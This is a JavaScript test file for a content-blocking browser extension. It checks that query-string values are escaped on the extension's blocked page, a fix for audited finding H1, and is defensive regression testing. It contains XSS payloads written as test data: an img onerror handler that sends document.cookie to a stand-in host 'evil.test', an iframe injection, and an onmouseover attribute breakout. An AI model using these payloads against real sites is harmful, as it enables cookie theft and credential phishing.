// HTML injection into the extension's own origin via blocked.html (audit
// finding H1).
//
// Every value on the blocked page comes out of the query string, and
// blocked.html is listed in web_accessible_resources for <all_urls> — so any
// website can navigate to it, or frame it, with a `url` of its choosing. In
// plain-HTML mode those values were substituted into the user's template
// unescaped and written with document.write().
//
// The extension CSP (script-src 'self') stops injected <script> from running,
// which is why this is not remote code execution. It does not stop markup: an
// attacker could render a convincing "BlockNSFW — enter your PIN" form at a
// genuine chrome-extension:// address, and img-src is unrestricted, so what
// gets typed can be sent somewhere. That is a credible attack on exactly this
// product's users.
//
// The shipped example template (examples/custom-blocked-page.html) uses
// {{url}}, so the documented configuration was the vulnerable one.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const ROOT = path.join(__dirname, '..');
const source = fs.readFileSync(path.join(ROOT, 'blocked.js'), 'utf8');

// Run blocked.js against a fake DOM, with a query string and stored settings
// we control. Returns whatever the page ended up writing.
function renderBlockedPage({ query, settings }) {
  const written = [];
  const elements = new Map();
  // blocked.js inserts the reason/score/chips after #target-url, so every
  // element needs a parent that accepts insertBefore.
  const makeEl = () => {
    const el = {
      textContent: '', className: '', style: {}, dataset: {},
      appendChild() {}, setAttribute() {}, addEventListener() {},
      insertBefore() {}, nextSibling: null
    };
    el.parentNode = {
      insertBefore() {},
      removeChild() {},
      appendChild() {}
    };
    return el;
  };

  const sandbox = {
    console,
    URL,
    URLSearchParams,
    Promise,
    setTimeout,
    location: { href: `chrome-extension://abc/blocked.html${query}`, replace() {} },
    history: { length: 1, back() {} },
    window: { open() {} },
    document: {
      getElementById: (id) => {
        if (!elements.has(id)) elements.set(id, makeEl());
        return elements.get(id);
      },
      querySelector: () => makeEl(),
      createElement: makeEl,
      addEventListener() {},
      open() {},
      write: (html) => { written.push(html); },
      close() {}
    },
    browser: undefined,
    chrome: {
      runtime: { getURL: (p) => p },
      storage: {
        local: { get: () => Promise.resolve({ pblocker_settings: settings }) }
      }
    }
  };
  sandbox.globalThis = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(source, sandbox);
  return { written, elements };
}

const PLAIN_HTML_SETTINGS = {
  blockedPageType: 'plain_html',
  plainBlockedPageHtml: '<h1>Blocked</h1><p>{{reason}}</p><code>{{url}}</code>'
};

const flush = () => new Promise(done => setImmediate(done));

test('H1: a script payload in ?url= is escaped, not written as markup', async () => {
  const payload = '<img src=x onerror="fetch(\'https://evil.test/\'+document.cookie)">';
  const { written } = renderBlockedPage({
    query: '?url=' + encodeURIComponent(payload),
    settings: PLAIN_HTML_SETTINGS
  });
  await flush();

  assert.equal(written.length, 1, 'the template should have rendered');
  const html = written[0];
  assert.ok(!html.includes('<img'), 'raw <img> reached the document');
  assert.ok(html.includes('&lt;img'), 'the payload should be escaped and visible as text');
  // The literal text "onerror=" is still in the output, and that is correct —
  // it renders as visible text inside the template's element rather than as an
  // attribute. What must not exist is a real element carrying a real handler.
  assert.ok(!/<[a-z]+[^>]*\son[a-z]+\s*=/i.test(html),
    'an element in the output carries an inline event handler');
});

test('H1: a payload in ?reason= is escaped too', async () => {
  // reason feeds getReasonMeta()'s default branch, which passes the raw value
  // through as the detail line, so it reaches the template as well.
  const { written } = renderBlockedPage({
    query: '?url=https%3A%2F%2Fx.test&reason=' +
      encodeURIComponent('<iframe src="https://evil.test"></iframe>'),
    settings: PLAIN_HTML_SETTINGS
  });
  await flush();

  const html = written[0];
  assert.ok(!html.includes('<iframe'), 'raw <iframe> reached the document');
  assert.ok(html.includes('&lt;iframe'));
});

test('H1: quote breaking cannot escape an attribute in the template', async () => {
  const { written } = renderBlockedPage({
    query: '?url=' + encodeURIComponent('" onmouseover="alert(1)') ,
    settings: {
      blockedPageType: 'plain_html',
      plainBlockedPageHtml: '<a href="#" title="{{url}}">blocked</a>'
    }
  });
  await flush();

  const html = written[0];
  // The literal text "onmouseover=" still appears — and is inert, because the
  // quote that would have closed the attribute is encoded. What must not
  // appear is a real quote followed by the handler, which is what would end
  // the title="" attribute and start a new one.
  assert.ok(!html.includes('" onmouseover'), 'broke out of the attribute');
  assert.ok(html.includes('&quot;'), 'the quote must be entity-encoded');
  assert.ok(html.includes('title="&quot; onmouseover=&quot;alert(1)"'),
    'the whole payload should sit inside the attribute as inert text');
});

test('H1: the template itself still renders as HTML', async () => {
  // Only the substituted values are escaped — the user wrote the template and
  // means it as markup. Escaping it too would break the whole feature.
  const { written } = renderBlockedPage({
    query: '?url=https%3A%2F%2Fx.test%2Fpage',
    settings: PLAIN_HTML_SETTINGS
  });
  await flush();

  const html = written[0];
  assert.ok(html.includes('<h1>Blocked</h1>'), 'the template must not be escaped');
  assert.ok(html.includes('https://x.test/page'), 'a benign URL renders as-is');
});

test('H1: a website cannot force plain-HTML mode for a user who has not chosen it', async () => {
  // The mode used to come from the query string, so any page could select this
  // rendering path. It comes from settings now.
  const { written } = renderBlockedPage({
    query: '?mode=plain_html&url=' + encodeURIComponent('<b>x</b>'),
    settings: {
      blockedPageType: 'default',
      plainBlockedPageHtml: '<h1>{{url}}</h1>'   // saved, but not selected
    }
  });
  await flush();

  assert.deepEqual(written, [], 'plain-HTML mode must not render when it is not the chosen type');
});

test('H1: plain-HTML mode with no saved template renders nothing', async () => {
  const { written } = renderBlockedPage({
    query: '?url=https%3A%2F%2Fx.test',
    settings: { blockedPageType: 'plain_html', plainBlockedPageHtml: '   ' }
  });
  await flush();
  assert.deepEqual(written, []);
});

test('H1: the shipped example template uses the substitution that was vulnerable', () => {
  // If the example stops using {{url}}, the tests above stop covering the
  // configuration users actually copy.
  const example = fs.readFileSync(
    path.join(ROOT, 'examples', 'custom-blocked-page.html'), 'utf8');
  assert.ok(example.includes('{{url}}'),
    'the documented template should still exercise the escaped path');
});


test('privacy mode never renders a custom HTML template with external resources', async () => {
  const { written } = renderBlockedPage({
    query: '?mode=plain_html&url=https%3A%2F%2Fprivate.example',
    settings: {
      privacyMode: true,
      blockedPageType: 'plain_html',
      plainBlockedPageHtml: '<img src="https://third-party.example/pixel?url={{url}}">'
    }
  });
  await flush();
  assert.deepEqual(written, []);
});
